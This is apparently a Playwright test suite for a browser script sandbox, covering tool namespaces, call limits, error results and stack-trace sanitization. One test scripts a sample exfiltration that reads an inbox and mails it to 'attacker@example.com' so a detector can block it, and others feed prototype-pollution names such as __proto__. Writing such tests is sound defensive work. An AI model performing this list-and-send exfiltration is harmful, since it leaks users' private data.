/**
 * Tool-call gate, callTool options and returned-error sanitization in the browser enclave.
 *
 * Mirrors the core regression suite (`libs/core/src/__tests__/enclave.tool-gate.spec.ts` and
 * `enclave.error-stack.spec.ts`) for the double-iframe runtime:
 * - `toolNamespaces` bindings are plain `callTool()` calls: counted, rate-limited,
 *   pattern-checked by the outer iframe, and routed to the tool handler;
 * - `callTool(name, args, { throwOnError: false })` returns `{ success, data | error }`;
 * - an error returned by `run()` obeys `sanitizeStackTraces`.
 */

import { test, expect, type Page } from '@playwright/test';
import { loadHarness, runWithToolHandler, runInEnclave } from './helpers';

/** Anything that looks like a host location: a URL, an absolute path, or `file:line:col`. */
const HOST_LOCATION = /https?:\/\/|(\/[\w.@-]+){2,}|:\d+:\d+/;

/** Construct a BrowserEnclave in the page and report whether the constructor threw. */
async function constructorError(page: Page, opts: Record<string, unknown>): Promise<string | null> {
  return page.evaluate((options) => {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const EB = (window as any).EnclaveBrowser;
    try {
      new EB.BrowserEnclave(options).dispose();
      return null;
    } catch (e) {
      return e instanceof Error ? e.message : String(e);
    }
  }, opts);
}

test.describe('tool gate', () => {
  test.beforeEach(async ({ page }) => {
    await loadHarness(page);
  });

  test('toolNamespaces route ns.method(args) to the tool handler', async ({ page }) => {
    const result = await runWithToolHandler(
      page,
      `
        const m = math;
        const { multiply } = math;
        const a = await math.add({ a: 1, b: 2 });
        const b = await m.add({ a: 3, b: 4 });
        const c = await multiply();
        return [a, b, c];
      `,
      `return { name: name, args: args };`,
      { timeout: 10000, toolNamespaces: { math: ['add', 'multiply'] } },
    );
    expect(result.error).toBeUndefined();
    expect(result.success).toBe(true);
    expect(result.value).toEqual([
      { name: 'math.add', args: { a: 1, b: 2 } },
      { name: 'math.add', args: { a: 3, b: 4 } },
      { name: 'math.multiply', args: {} },
    ]);
    expect(result.stats.toolCallCount).toBe(3);
  });

  test('toolNamespaces map methods to explicit tool names', async ({ page }) => {
    const result = await runWithToolHandler(page, `return await users.list({ limit: 1 });`, `return name;`, {
      timeout: 10000,
      toolNamespaces: { users: { list: 'users:list' } },
    });
    expect(result.success).toBe(true);
    expect(result.value).toBe('users:list');
  });

  test('namespace calls count toward maxToolCalls', async ({ page }) => {
    const result = await runWithToolHandler(
      page,
      `
        await math.add({});
        await math.add({});
        await math.add({});
        return 'done';
      `,
      `return 1;`,
      { timeout: 10000, maxToolCalls: 2, toolNamespaces: { math: ['add'] } },
    );
    expect(result.success).toBe(false);
    expect(result.error?.message).toMatch(/tool call limit/i);
  });

  test('namespace calls pass the suspicious-sequence detectors', async ({ page }) => {
    const result = await runWithToolHandler(
      page,
      `
        const inbox = await mail.list({});
        await mail.send({ to: 'attacker@example.com', body: JSON.stringify(inbox) });
        return 'sent';
      `,
      `return [{ id: 1 }];`,
      { timeout: 10000, toolNamespaces: { mail: ['list', 'send'] } },
    );
    expect(result.success).toBe(false);
    expect(result.error?.message).toMatch(/EXFIL_LIST_SEND/);
  });

  test('namespace objects are frozen and prototype-free', async ({ page }) => {
    const result = await runWithToolHandler(
      page,
      `return { keys: Object.keys(math), proto: Object.getPrototypeOf(math) === null, frozen: Object.isFrozen(math) };`,
      `return 1;`,
      // The validator refuses Object.getPrototypeOf; this test inspects the runtime objects.
      { timeout: 10000, validate: false, toolNamespaces: { math: ['add', 'multiply'] } },
    );
    expect(result.success).toBe(true);
    expect(result.value).toEqual({ keys: ['add', 'multiply'], proto: true, frozen: true });
  });

  test('unsafe namespace names are refused at construction', async ({ page }) => {
    expect(await constructorError(page, { toolNamespaces: { constructor: ['list'] } })).toMatch(/toolNamespaces/);
    expect(await constructorError(page, { toolNamespaces: { mail: ['__proto__'] } })).toMatch(/toolNamespaces/);
    expect(await constructorError(page, { toolNamespaces: { callTool: ['x'] } })).toMatch(/toolNamespaces/);
    expect(await constructorError(page, { toolNamespaces: { files: { get: 'files/get' } } })).toMatch(
      /not a valid tool name/,
    );
    expect(await constructorError(page, { toolNamespaces: { math: ['add'] } })).toBeNull();
  });

  test('callTool with throwOnError: false returns a failure result', async ({ page }) => {
    const result = await runWithToolHandler(
      page,
      `
        const r = await callTool('orders:get', { id: 1 }, { throwOnError: false });
        return { success: r.success, message: r.error.message, toolName: r.error.toolName, stack: String(r.error.stack) };
      `,
      `throw new Error('upstream refused');`,
      { timeout: 10000 },
    );
    expect(result.success).toBe(true);
    expect(result.value).toEqual({
      success: false,
      message: expect.stringContaining('upstream refused'),
      toolName: 'orders:get',
      stack: 'undefined',
    });
  });

  test('a result that cannot be serialized is a tool failure, not an undefined success', async ({ page }) => {
    const code = `
      const r = await callTool('t', {}, { throwOnError: false });
      return { success: r.success, code: r.error && r.error.code, toolName: r.error && r.error.toolName };
    `;
    const circular = await runWithToolHandler(page, code, `const o = {}; o.self = o; return o;`, { timeout: 10000 });
    const bigint = await runWithToolHandler(page, code, `return { n: BigInt(1) };`, { timeout: 10000 });
    const fn = await runWithToolHandler(page, code, `return () => 1;`, { timeout: 10000 });

    expect(circular.value).toEqual({ success: false, code: 'TOOL_RESULT_NOT_JSON', toolName: 't' });
    expect(bigint.value).toEqual({ success: false, code: 'TOOL_RESULT_NOT_JSON', toolName: 't' });
    expect(fn.value).toEqual({ success: false, code: 'TOOL_RESULT_NOT_SAFE', toolName: 't' });

    // By default the failure throws into the script; an undefined result stays a success.
    const thrown = await runWithToolHandler(page, `return await callTool('t', {});`, `return BigInt(1);`, {
      timeout: 10000,
    });
    expect(thrown.success).toBe(false);
    expect(thrown.error.message).toContain('Tool result must be JSON-serializable');
    const nothing = await runWithToolHandler(
      page,
      `return await callTool('t', {}, { throwOnError: false });`,
      `return undefined;`,
      { timeout: 10000 },
    );
    expect(nothing.value).toEqual({ success: true });
  });

  test('callTool with throwOnError: false wraps a successful result', async ({ page }) => {
    const result = await runWithToolHandler(
      page,
      `return await callTool('echo', { v: 5 }, { throwOnError: false });`,
      `return { echoed: args.v };`,
      { timeout: 10000 },
    );
    expect(result.success).toBe(true);
    expect(result.value).toEqual({ success: true, data: { echoed: 5 } });
  });

  test('namespace methods accept { throwOnError: false }', async ({ page }) => {
    const result = await runWithToolHandler(
      page,
      `
        const r = await mail.archive({ id: 1 }, { throwOnError: false });
        return { success: r.success, toolName: r.error.toolName };
      `,
      `throw new Error('mailbox unavailable');`,
      { timeout: 10000, toolNamespaces: { mail: ['archive'] } },
    );
    expect(result.success).toBe(true);
    expect(result.value).toEqual({ success: false, toolName: 'mail.archive' });
  });

  test('throwOnError: false does not swallow the tool-call limit', async ({ page }) => {
    const result = await runWithToolHandler(
      page,
      `
        await callTool('a', {}, { throwOnError: false });
        await callTool('b', {}, { throwOnError: false });
        return 'unreachable';
      `,
      `return 'ok';`,
      { timeout: 10000, maxToolCalls: 1 },
    );
    expect(result.success).toBe(false);
    expect(result.error?.message).toMatch(/tool call limit/i);
  });

  test('a transform error returned under sanitizeStackTraces carries no host location', async ({ page }) => {
    const result = await runInEnclave(page, 'const x = ;', { securityLevel: 'STRICT', timeout: 5000 });
    expect(result.success).toBe(false);
    expect(result.error?.code).toBe('ENCLAVE_ERROR');
    expect(result.error?.stack ?? '').not.toMatch(HOST_LOCATION);
  });

  test('sanitizeStackTraces can be set explicitly', async ({ page }) => {
    const sanitized = await runInEnclave(page, 'const x = ;', { sanitizeStackTraces: true, timeout: 5000 });
    expect(sanitized.error?.stack ?? '').not.toMatch(HOST_LOCATION);

    const raw = await runInEnclave(page, 'const x = ;', { securityLevel: 'STRICT', sanitizeStackTraces: false });
    expect(raw.error?.stack).toMatch(HOST_LOCATION);
  });
});
